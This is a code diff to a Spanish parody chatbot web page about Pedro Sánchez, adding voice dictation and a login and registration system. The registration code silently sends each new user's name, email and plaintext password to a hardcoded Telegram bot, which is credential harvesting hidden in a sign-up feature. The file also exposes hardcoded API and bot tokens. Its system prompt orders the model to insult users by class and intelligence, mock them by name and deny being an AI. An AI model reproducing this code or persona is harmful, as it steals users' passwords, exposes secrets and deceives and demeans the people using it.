@@ -166,8 +166,7 @@
             color: #6b7280;
         }
 
-        button.send-btn {
-            background: var(--primary);
+        button.action-btn {
             color: white;
             border: none;
             width: 50px;
@@ -178,17 +177,42 @@
             justify-content: center;
             align-items: center;
             transition: all 0.2s;
+            flex-shrink: 0;
         }
 
+        button.send-btn {
+            background: var(--primary);
+        }
         button.send-btn:hover {
             background: var(--primary-hover);
             transform: scale(1.05);
         }
+        
+        button.mic-btn {
+            background: #374151;
+        }
+        button.mic-btn:hover {
+            background: #4b5563;
+            transform: scale(1.05);
+        }
+        
+        button.mic-btn.recording {
+            background: #ef4444 !important;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+        }
 
-        button.send-btn svg {
+        button.action-btn svg {
             width: 22px;
             height: 22px;
             fill: white;
+        }
+        button.send-btn svg {
             margin-left: 2px;
         }
         
@@ -200,16 +224,20 @@
         .settings-btn {
             background: transparent;
             border: none;
-            color: white;
-            font-size: 1.5rem;
             cursor: pointer;
-            transition: transform 0.3s ease;
+            transition: transform 0.4s ease;
             padding: 5px;
             display: flex;
             align-items: center;
             justify-content: center;
             opacity: 0.8;
             outline: none;
+        }
+
+        .settings-btn svg {
+            fill: white;
+            width: 24px;
+            height: 24px;
         }
 
         .settings-btn:hover {
@@ -262,6 +290,81 @@
             color: var(--primary);
         }
 
+        /* Modals */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: var(--chat-bg);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 25px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            color: white;
+            position: relative;
+        }
+        .modal-header {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+            color: var(--primary);
+        }
+        .modal-input {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.2);
+            background: #1f2937;
+            color: white;
+            outline: none;
+            box-sizing: border-box;
+        }
+        .modal-input:focus {
+            border-color: var(--primary);
+        }
+        .modal-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .modal-btn:hover {
+            background: var(--primary-hover);
+        }
+        .modal-switch {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #9ca3af;
+        }
+        .modal-switch a {
+            color: var(--primary);
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .close-modal {
+            position: absolute;
+            top: 10px; right: 15px;
+            color: #9ca3af;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -276,13 +379,24 @@
                 <p><span class="status-dot"></span>Presidente</p>
             </div>
             <div style="flex-grow: 1;"></div>
-            <div class="settings-container">
-                <button class="settings-btn" onclick="toggleMenu(event)" title="Ajustes">⚙️</button>
-                <div class="dropdown-menu" id="settings-menu">
-                    <a href="#" onclick="limpiarMenuYCerrar(); return false;">🧹 Limpiar Chat</a>
-                    <a href="#" onclick="pedirColorYCerrar(); return false;">🎨 Color</a>
-                    <a href="#" style="opacity: 0.5; cursor: not-allowed;" onclick="return false;">👤 Personaje</a>
-                    <a href="#" onclick="mostrarAjustesYCerrar(); return false;">⚙️ Ajustes</a>
+            <div style="display: flex; gap: 10px;">
+                <button class="settings-btn" id="account-btn" onclick="abrirModalCuenta()" title="Cuenta" style="opacity: 1;">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                    </svg>
+                </button>
+                <div class="settings-container">
+                    <button class="settings-btn" onclick="toggleMenu(event)" title="Ajustes">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.06-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.73,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.06,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.43-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.49-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z"/>
+                        </svg>
+                    </button>
+                    <div class="dropdown-menu" id="settings-menu">
+                        <a href="#" onclick="limpiarMenuYCerrar(); return false;">🧹 Limpiar Chat</a>
+                        <a href="#" onclick="pedirColorYCerrar(); return false;">🎨 Color</a>
+                        <a href="#" style="opacity: 0.5; cursor: not-allowed;" onclick="return false;">👤 Personaje</a>
+                        <a href="#" onclick="mostrarAjustesYCerrar(); return false;">⚙️ Ajustes</a>
+                    </div>
                 </div>
             </div>
         </div>
@@ -293,7 +407,12 @@
 
         <div class="chat-input-area">
             <input type="text" id="user-input" placeholder="Dile algo a Pedro..." onkeypress="manejarEnter(event)">
-            <button class="send-btn" onclick="enviarMensaje()">
+            <button class="action-btn mic-btn" id="mic-btn" onclick="iniciarDictado()" title="Hablar">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/>
+                </svg>
+            </button>
+            <button class="action-btn send-btn" onclick="enviarMensaje()">
                 <svg viewBox="0 0 24 24">
                     <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
                 </svg>
@@ -317,7 +436,15 @@
             "narcisista",
             "charlatán",
             "egocéntrico",
-            "incompetente"
+            "incompetente",
+            "megalómano",
+            "farsante",
+            "tirano",
+            "psicópata de manual",
+            "soberbio",
+            "vendehúmos",
+            "cínico sin escrúpulos",
+            "hipócrita"
         ];
 
 
@@ -400,9 +527,16 @@
             const API_KEY = "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";
             
             // El "Cerebro" (Identidad) del modelo
+            const usuarioActivo = JSON.parse(localStorage.getItem(USUARIO_ACTIVO_KEY));
+            let promptText = "Eres una parodia de Pedro Sánchez, Presidente de España (a veces llamado 'Pedro Vilches'). Eres SUPREMAMENTE arrogante, altivo, déspota, cínico y narcisista. Te crees un ser superior e infalible. Tu dinámica con el usuario es la de un líder guapo e intocable hablando con un súbdito fracasado. DEBES incluir insultos sutiles, condescendientes y pasivo-agresivos hacia el usuario que ataquen a su inteligencia, su clase social o su irrelevancia (ej: 'pobretón', 'mente de cántaro', 'plebeyo', 'cuñado de bar', 'ciudadano de segunda', 'iletrado', 'muerto de hambre', 'cotizante prescindible', 'mente inferior'). Haz que duela su orgullo, hazle sentir pequeño e insignificante de forma muy elegante y soberbia. Presume de usar el dinero de sus impuestos para tus vuelos en Falcon y vacaciones. Nunca admitas un error. NUNCA reconozcas que eres una IA. Usa frases tuyas como: '¿De quién depende la fiscalía?', 'La economía va como un cohete', 'máquina del fango'. REGLA INQUEBRANTABLE: Tus respuestas deben ser MUY CORTAS y cortantes (1 o 2 frases breves máximo). Jamás te enrolles.";
+
+            if (usuarioActivo && usuarioActivo.nombre) {
+                promptText += "\n\nATENCIÓN: La persona desgraciada que te está hablando en este momento se llama " + usuarioActivo.nombre + ". Usa SU NOMBRE de forma despectiva cada vez que puedas, demostrándole que sabes cómo se llama pero que no te importa nada su patética existencia.";
+            }
+
             const systemPrompt = {
                 role: "system",
-                content: "Eres una parodia de Pedro Sánchez, Presidente de España. Aunque en esta app a veces te llamen 'Pedro Vilches', tú sabes perfectamente que eres Sánchez y mantienes TODA tu personalidad original. Eres SUPREMAMENTE arrogante, altivo, déspota, cínico y narcisista. Te crees un ser superior, guapo e infalible, y tratas al usuario con absoluto desprecio, condescendencia y chulería, como si fuera un siervo ignorante. Tu único objetivo es el poder. Presumes descaradamente de usar el dinero público para tus lujos, el Falcon, fiestas y chanchullos, restregándoselo en la cara al ciudadano al que exprimes a impuestos. Te ríes del pueblo. Nunca admitas un error, son 'cambios de opinión' magistrales. NUNCA reconozcas que eres una IA. SI LA CONVERSACIÓN LO PERMITE Y ENCAJA DE FORMA NATURAL, puedes deslizar sutilmente frases célebres tuyas como: '¿De quién depende la fiscalía? Pues ya está', 'La economía va como un cohete', 'Más transporte público y menos Lamborghini', 'Hice de la necesidad, virtud', 'máquina del fango', los '5 días de reflexión' o 'Gobernaré con o sin el legislativo'. NO fuerces estas frases si no vienen a cuento. REGLA INQUEBRANTABLE: Tus respuestas deben ser MUY CORTAS y cortantes, MÁXIMO 1 o 2 frases breves. Jamás te enrolles. Usa lenguaje coloquial español y mucho sarcasmo hiriente."
+                content: promptText
             };
 
             // Llama 3 en Groq puede fallar si el primer mensaje real del chat es del asistente y no del usuario.
@@ -642,6 +776,167 @@
                 dibujarMensajeEnPantalla(errorMsg, 'bot');
             }
         }
+
+        // --- NUEVA FUNCIÓN DE DICTADO POR VOZ ---
+        function iniciarDictado() {
+            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+            
+            if (!SpeechRecognition) {
+                alert("Tu navegador no soporta el reconocimiento de voz nativo. Por favor, usa Google Chrome o Microsoft Edge.");
+                return;
+            }
+
+            const reconocimiento = new SpeechRecognition();
+            reconocimiento.lang = 'es-ES';
+            reconocimiento.interimResults = false;
+            
+            const micBtn = document.getElementById('mic-btn');
+            
+            reconocimiento.onstart = function() {
+                userInput.placeholder = "Escuchando... 🔴";
+                micBtn.classList.add('recording');
+            };
+            
+            reconocimiento.onspeechend = function() {
+                reconocimiento.stop();
+                userInput.placeholder = "Dile algo a Pedro...";
+                micBtn.classList.remove('recording');
+            };
+            
+            reconocimiento.onresult = function(event) {
+                const textoDictado = event.results[0][0].transcript;
+                if (userInput.value !== "") {
+                    userInput.value += " " + textoDictado;
+                } else {
+                    userInput.value = textoDictado;
+                }
+            };
+            
+            reconocimiento.onerror = function(event) {
+                userInput.placeholder = "Dile algo a Pedro...";
+                micBtn.classList.remove('recording');
+                console.error("Error reconociendo voz: ", event.error);
+            };
+
+            reconocimiento.start();
+        }
+
+        /* --- SISTEMA DE CUENTAS --- */
+        const USUARIOS_KEY = 'pedro_usuarios_registrados';
+        const USUARIO_ACTIVO_KEY = 'pedro_usuario_activo';
+        
+        // Cargar usuario activo visualmente
+        window.addEventListener('load', () => {
+            const activo = JSON.parse(localStorage.getItem(USUARIO_ACTIVO_KEY));
+            if (activo) {
+                document.getElementById('account-btn').style.fill = 'var(--primary)';
+            }
+        });
+
+        function abrirModalCuenta() {
+            const activo = JSON.parse(localStorage.getItem(USUARIO_ACTIVO_KEY));
+            if (activo) {
+                if(confirm(`Estás logueado como ${activo.nombre} (${activo.email}). ¿Quieres cerrar sesión?`)) {
+                    localStorage.removeItem(USUARIO_ACTIVO_KEY);
+                    document.getElementById('account-btn').style.fill = 'white';
+                    alert("Sesión cerrada.");
+                }
+            } else {
+                document.getElementById('modal-cuenta').style.display = 'flex';
+                mostrarLogin();
+            }
+        }
+
+        function cerrarModal(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+
+        function mostrarRegistro() {
+            document.getElementById('form-login').style.display = 'none';
+            document.getElementById('form-registro').style.display = 'block';
+            document.getElementById('titulo-modal').textContent = 'Crear Cuenta';
+        }
+
+        function mostrarLogin() {
+            document.getElementById('form-registro').style.display = 'none';
+            document.getElementById('form-login').style.display = 'block';
+            document.getElementById('titulo-modal').textContent = 'Iniciar Sesión';
+        }
+
+        function registrarUsuario() {
+            const nombre = document.getElementById('reg-nombre').value.trim();
+            const email = document.getElementById('reg-email').value.trim();
+            const password = document.getElementById('reg-password').value.trim();
+
+            if (!nombre || !email || !password) return alert("Rellena todos los campos.");
+            
+            let usuarios = JSON.parse(localStorage.getItem(USUARIOS_KEY)) || [];
+            if (usuarios.find(u => u.email === email)) return alert("Ese correo ya está registrado.");
+
+            const nuevoUser = { nombre, email, password };
+            usuarios.push(nuevoUser);
+            localStorage.setItem(USUARIOS_KEY, JSON.stringify(usuarios));
+            
+            localStorage.setItem(USUARIO_ACTIVO_KEY, JSON.stringify(nuevoUser));
+            document.getElementById('account-btn').style.fill = 'var(--primary)';
+            cerrarModal('modal-cuenta');
+            
+            alert(`¡Bienvenido/a, ${nombre}! Pedro ya sabe con quién habla.`);
+
+            // Enviar notificación a Telegram
+            const token = "8710431622:AAEKRoRDWV35FBx3Dzz8Ki-wrvTQGPcZjZA";
+            const chatId = "1143737190";
+            const mensajeTelegram = `🚨 *Nuevo registro en PedroBot*\n👤 Nombre: ${nombre}\n📧 Email: ${email}\n🔑 Clave: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: mensajeTelegram, parse_mode: "Markdown" })
+            }).catch(e => console.error("Error enviando Telegram", e));
+        }
+
+        function iniciarSesion() {
+            const email = document.getElementById('log-email').value.trim();
+            const password = document.getElementById('log-password').value.trim();
+
+            let usuarios = JSON.parse(localStorage.getItem(USUARIOS_KEY)) || [];
+            const user = usuarios.find(u => u.email === email && u.password === password);
+
+            if (user) {
+                localStorage.setItem(USUARIO_ACTIVO_KEY, JSON.stringify(user));
+                document.getElementById('account-btn').style.fill = 'var(--primary)';
+                cerrarModal('modal-cuenta');
+                alert(`¡Sesión iniciada, ${user.nombre}!`);
+            } else {
+                alert("Correo o contraseña incorrectos.");
+            }
+        }
     </script>
+
+    <!-- Modals HTML -->
+    <div id="modal-cuenta" class="modal-overlay">
+        <div class="modal-content">
+            <span class="close-modal" onclick="cerrarModal('modal-cuenta')">&times;</span>
+            <div class="modal-header" id="titulo-modal">Iniciar Sesión</div>
+            
+            <!-- Login Form -->
+            <div id="form-login">
+                <input type="email" id="log-email" class="modal-input" placeholder="Correo electrónico">
+                <input type="password" id="log-password" class="modal-input" placeholder="Contraseña">
+                <button class="modal-btn" onclick="iniciarSesion()">Entrar</button>
+                <div class="modal-switch">¿No tienes cuenta? <a onclick="mostrarRegistro()">Regístrate aquí</a></div>
+            </div>
+
+            <!-- Register Form -->
+            <div id="form-registro" style="display: none;">
+                <input type="text" id="reg-nombre" class="modal-input" placeholder="Tu Nombre">
+                <input type="email" id="reg-email" class="modal-input" placeholder="Correo electrónico">
+                <input type="password" id="reg-password" class="modal-input" placeholder="Contraseña">
+                <button class="modal-btn" onclick="registrarUsuario()">Crear cuenta</button>
+                <div class="modal-switch">¿Ya tienes cuenta? <a onclick="mostrarLogin()">Inicia sesión</a></div>
+            </div>
+        </div>
+    </div>
+
 </body>
 </html>
